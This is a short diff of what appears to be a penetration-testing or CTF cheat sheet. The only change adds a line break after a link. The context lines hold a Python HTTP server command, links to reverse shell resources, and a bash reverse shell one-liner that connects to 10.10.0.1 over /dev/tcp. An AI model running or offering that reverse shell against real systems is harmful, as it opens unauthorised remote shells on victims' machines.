@@ -1,7 +1,7 @@
 sudo python3 -m http.server 80
 ## Linux reverse shell
 
-<a href="https://weibell.github.io/reverse-shell-generator/">Reverse Shell Generator</a>
+<a href="https://weibell.github.io/reverse-shell-generator/">Reverse Shell Generator</a><br>
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Cheatsheet <3</a>
 ```bash
 bash -i >& /dev/tcp/10.10.0.1/777 0>&1
